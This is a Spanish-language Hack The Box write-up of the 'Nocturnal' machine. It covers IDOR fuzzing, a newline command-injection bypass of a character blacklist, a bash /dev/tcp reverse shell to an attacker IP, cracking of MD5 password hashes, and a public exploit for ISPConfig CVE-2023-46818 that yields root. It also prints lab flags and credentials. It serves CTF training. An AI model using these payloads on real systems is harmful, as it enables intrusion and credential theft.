---
permalink: /Nocturnal-HTB-Writeup
tags:
title: Nocturnal - Easy (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento
Empezamos por un escaneo de puerto y servicios con `nmap`. 

```bash 
nmap -sCV -p22,80 10.129.232.23                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 13:23 -03
Nmap scan report for 10.129.232.23
Host is up (0.56s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.01 seconds
```

## Website / Port 80

Al parecer el sitio web es una pagina de archivos compartidos, tenemos un apartado de registro, por lo que nos registramos
![{037E8695-A709-4B28-B5FD-54465C8B1717}](images/{037E8695-A709-4B28-B5FD-54465C8B1717}.png)

Tenemos un apartado de registro y de login, por lo que nos registramos, para luego loguearnos en la pagina.

![{11567564-AB1A-428C-A1C1-98B1AE52011C}](images/{11567564-AB1A-428C-A1C1-98B1AE52011C}.png)

Luego de registrarme y iniciar sesion en la pagina, vemos una seccion donde podemos cargar archivos.

![{51AB0E6A-8A13-4946-9AD2-0DC706AEAAB7}](images/{51AB0E6A-8A13-4946-9AD2-0DC706AEAAB7}.png)

Pero intentando subir una imagen com oprueba, vemos el siguiente mensaje.

![image-20250413123414043](images/image-20250413123414043.webp)

Vemos que podemos subir archivos con extensiones, `pdf`, `odt`, `doc`, `xlsx`, entre otras, y si interceptamos la petición con `Burpsuite` veremos que al enviar podemos descargar los archivos y nos redirige a las ruta `http://nocturnal.htb/view.php?username=zsln&file=image.png`antes de descargar el file, pero si intentamos realizar un bypass de las validaciones de archivos vamos a ver que no tenemos éxito, pero la ruta anterior no da chance a probar que en el parámetro `username` podamos pasarle cualquier otro nombre y capaz revelemos archivos o podamos ganar acceso como dicho usuario.

### Directory bruteforce

```bash
feroxbuster -u http://nocturnal.htb -x php
                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nocturnal.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://nocturnal.htb/admin.php => login.php
200      GET      161l      327w     3105c http://nocturnal.htb/style.css
200      GET       21l       45w      644c http://nocturnal.htb/login.php
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET       29l      145w     1524c http://nocturnal.htb/
302      GET        0l        0w        0c http://nocturnal.htb/logout.php => login.php
403      GET        7l       10w      162c http://nocturnal.htb/uploads
200      GET       29l      145w     1524c http://nocturnal.htb/index.php
302      GET      123l      236w     2919c http://nocturnal.htb/view.php => login.php
301      GET        7l       12w      178c http://nocturnal.htb/backups => http://nocturnal.htb/backups/
302      GET        0l        0w        0c http://nocturnal.htb/dashboard.php => login.php
403      GET        7l       10w      162c http://nocturnal.htb/uploads_admin
403      GET        7l       10w      162c http://nocturnal.htb/uploads_user
403      GET        7l       10w      162c http://nocturnal.htb/uploads_group
403      GET        7l       10w      162c http://nocturnal.htb/uploads2
403      GET        7l       10w      162c http://nocturnal.htb/uploads_video
403      GET        7l       10w      162c http://nocturnal.htb/uploads_event
403      GET        7l       10w      162c http://nocturnal.htb/uploads_forum
403      GET        7l       10w      162c http://nocturnal.htb/uploads3
[####################] - 2m     60003/60003   0s      found:19      errors:2      
[####################] - 2m     30000/30000   271/s   http://nocturnal.htb/ 
[####################] - 2m     30000/30000   272/s   http://nocturnal.htb/backups/
```

Veo varios archivos y rutas, dentro de las cuales esta `admin.php`pero me redirige a un panel de login, además una carpeta `backups`, pero me devuelve un `403`.
## Shell as www-data

Volviendo a lo anterior podemos fuzzear en los `parametros` `file` y `username`, donde quizas veamos otros usuarios y se de la vulnerabilidad `IDOR`.

Para eso fuzzeamos con la herramienta `wfuzz` de la siguiente forma.

```bash 
 wfuzz -c -t 200 -u 'http://nocturnal.htb/view.php?username=FUZZ&file=shell1.php.pdf'  -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -H 'Cookie: PHPSESSID=qbtpcb9genhcg890hg9cbeq1e5' --hh=2985
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz''s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nocturnal.htb/view.php?username=FUZZ&file=shell1.php.pdf
Total requests: 8295455

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000002:   200        128 L    247 W      3037 Ch     "admin"                                              
000000194:   200        128 L    248 W      3113 Ch     "amanda"
000002688:   200        128 L    247 W      3037 Ch     "tobias"
```

Veo que me identifico al usuario `amanda` y `tobias`, y en la `url` si pongo el usuario amanda en vez de `zs1n`, veo algo.

![{24093D7F-57BD-4F19-AF69-EBB318E6C175}](images/{24093D7F-57BD-4F19-AF69-EBB318E6C175}.png)

Veo que `amanda` tiene un archivo `privacy.odt`.
Si lo descargamos y vemos con `file` que tipo de contenido tiene veremos que es parecido a un comprimido `zip`, lo descomprimimos con `7z` para ver su contenido en bruto.

```bash 
7z x privacy.odt
```

Y veo que dentro de `content.xml` veo que se envia un mensaje a `amanda` diciéndole que le cambiaron/resetearon a unas nuevas credenciales para su cuenta 

```
cat content.xml | html2markdown 
Dear Amanda,Nocturnal has set the following temporary password for you:
arHkG7HAI68X8s1J. This password has been set for all our services, so it is
essential that you change it on your first login to ensure the security of
your account and our infrastructure.The file has been created and provided by
Nocturnal's IT team. If you have any questions or need additional assistance
during the password change process, please do not hesitate to contact
us.Remember that maintaining the security of your credentials is paramount to
protecting your information and that of the company. We appreciate your prompt
attention to this matter.Yours sincerely,Nocturnal's IT team
```

Si me logueo como `amanda` en la pagina veo una interfaz distinta a la de un usuario normal con un boton adicional

![{565D6BE0-3C4B-4EAE-9A68-1D2DFEAD5B78}](images/{565D6BE0-3C4B-4EAE-9A68-1D2DFEAD5B78}.png)

Si damos click en el veremos que nos sale un panel con varios archivos para descargar y si ingresamos su debida `password` nos hace un comprimido en `zip` de todos los archivos.

![{FA070288-2EC2-4640-B22B-BFB396B08916}](images/{FA070288-2EC2-4640-B22B-BFB396B08916}.png)

### Detecting command injection

Dentro del codigo de `admin.php` veo la siguiente validacion en el input del usuario al ingresar la password, con la que se descarga el `zip`.

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

Vemos que los tipicos caracteres de inyeccion com: `{}, $, &&`, son bien sanitizados y validados en la pagina. Y como puedo ver tambien es de notar que hay muchas veces que el salto de linea no esta contemplado en la lista de filtros(`\n` o `%0a`), ademas tambien el hashtag (`#`), podriamos hacer una prueba con el siguiente payload

```bash
<password>\nid\n 
```
Donde el salto de linea lo representamos en formato `url encode`

![{2D562202-F744-4AED-8E51-793D64589162}](images/{2D562202-F744-4AED-8E51-793D64589162}.png)

Como veo que falla al llamar al comando `id`, podria evaluar otras alternativas como:

```bash
<password>\nbash -c "id"\n
```

Y este si me funciono, por lo que tenemos inyección remota de comandos (`RCE`). Ahora podemos enviarnos una shell a nuestra maquina

![{6DF3BBC3-4936-4093-9674-458E86AACF6B}](images/{6DF3BBC3-4936-4093-9674-458E86AACF6B}.png)

En mi caso cree un shell.sh con el siguiente contenido:

```bash
#!/bin/bash
bash -c "bash -i &> /dev/tcp/10.10.17.19/4444 0>&1"
```

Y desde la pagina lo descargo.

![{41480A6F-FEC8-4B64-A9BE-FD882844020B}](images/{41480A6F-FEC8-4B64-A9BE-FD882844020B}.png)

Y ahora lo corremos con el siguiente comando:

```bash
%0abash%2b-c%2b"bash%09shell.shw"%0a
```

```bash
sudo nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.23] 33754
bash: cannot set terminal process group (1001): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$ whoami
whoami
www-data
```

## Shell as tobias

### Enumeration

Como veo que en la ruta `/nocturnal_database` hay un archivo `.db` puedo usar el mismo `sqlite3`, para dumpear los datos de la base de datos

```bash
www-data@nocturnal:~/nocturnal_database$ sqlite3 nocturnal_database.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
);
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
INSERT INTO users VALUES(8,'zs1n','a4133d76d66414c84273048ab2548cb8');
INSERT INTO users VALUES(9,'test','098f6bcd4621d373cade4e832627b4f6');
CREATE TABLE uploads (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    file_name TEXT NOT NULL,
    upload_time DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(user_id) REFERENCES users(id)
);
INSERT INTO uploads VALUES(4,2,'privacy.odt','2024-10-18 02:05:53');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',9);
INSERT INTO sqlite_sequence VALUES('uploads',4);
COMMIT;
```

Ahi veo dentro de la misma los hashes de varios usuarios, los mismo `hashes` los meto dentro de un archivo que voy a llamar hashes, y luego con hashcat voy a tratar de romperlo para ver si descubro la `password` de alguno de los usuarios

```bash
hashcat -m 0 -a 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 5 8645HS w/ Radeon 760M Graphics, 1456/2912 MB (512 MB allocatable), 4MCU

[..snip..]

55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     
Approaching final keyspace - workload adjusted. 
```

`tobias:slowmotionapocalypse

Una vez tengo las creds del usuario `tobias` ya puedo conectarme via `ssh`

```bash 
 ssh tobias@nocturnal.htb                     
The authenticity of host 'nocturnal.htb (10.129.232.23)' can't be established.
ED25519 key fingerprint is: SHA256:rpVMGW27qcXKI/SxVXhvpF6Qi8BorsH7RNh1jzi8VYc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nocturnal.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tobias@nocturnal.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 10 Nov 2025 05:48:07 PM UTC

  System load:           0.4
  Usage of /:            56.0% of 5.58GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             238
  Users logged in:       0
  IPv4 address for eth0: 10.129.232.23
  IPv6 address for eth0: dead:beef::250:56ff:fe95:fd7e


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov 10 17:48:08 2025 from 10.10.17.19
tobias@nocturnal:~$
```

```bash
tobias@nocturnal:~$ cat user.txt 
1c822b12c47c1a782101b96abb108e60
```
## Shell as root

### Enumeration

Enumerando el sistema como el usuario `tobias` vemos que hay un servicio corriendo a nivel local por el puerto `8080` 

```bash 
tobias@nocturnal:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -  
```

Ademas vemos que el servicio que se ejecuta en ese puerto se ejecuta con `php` y como el usuario `root`.

```bash
tobias@nocturnal:~$ ps auxww | grep 8080
root         992  0.0  0.7 212412 30468 ?        Ss   16:23   0:00 /usr/bin/php -S 127.0.0.1:8080
tobias      2720  0.0  0.0   6432   656 pts/1    S+   17:51   0:00 grep --color=auto 8080
```

Hacemos `Port Forwarding` del puerto `8080`.

```bash 
ssh tobias@nocturnal.htb -L 8080:127.0.0.1:8080
```

Tambien podemos ver en la ruta `/var/www` que es ispconfig el que corre al parecer.

```bash
tobias@nocturnal:/var/www$ ls
html  ispconfig  nocturnal_database  nocturnal.htb  php-fcgi-scripts
```

Y si vamos a nuestro sistema local al puerto `8080` vemos que corre el servicio `ISPConfig`, asi que intentamos loguearnos con las credenciales obtenidas pero no tenemos exito, pero si probamos la credenciales de tobias con el usuario `admin` vemos que podemos entrar 

![image-20250414173143332](images/image-20250414173143332.webp)

Al ir a la seccion de `Help` vemos que corre `ISPConfig Version: 3.2.10p1` la cual tiene una vulnerabilidad encontrada en la ruta `<url>/admin/language_edit.php` la cual nos permite como atacantes y habiendo obtenido acceso como el `admin` del servicio, la posibilidad de inyectar codigo `PHP` y nos da acceso a una shell interactiva como el usuario privilegiado "`Root`". Hacemos uso de un PoC publicado en codigo `Python`

https://github.com/ajdumanhug/CVE-2023-46818 

En mi caso diseñe un PoC del mismo CVE en este [enlace](https://github.com/zs1n/CVE-2023-46818/blob/main/CVE-2023-46818.py)

```bash 
git clone https://github.com/zs1n/CVE-2023-46818
```

```bash 
python c.py --url http://127.0.0.1:8080 -U admin -P slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login Successful.
[+] Using random lang file: xtbywuab.lng
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_c05f4b51e0ff85849f9eddf6
[+] CSRF Key: ef36b622c61c80498fd27c51a876041b2bf60352
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:8080/admin/sh.php
[+] Launching shell...

ispconfig-shell# whoami
root
```

```bash 
ispconfig-shell# cat /root/root.txt
3ccc0ec435459f203e221347b9680907
```

`~Happy Hacking.`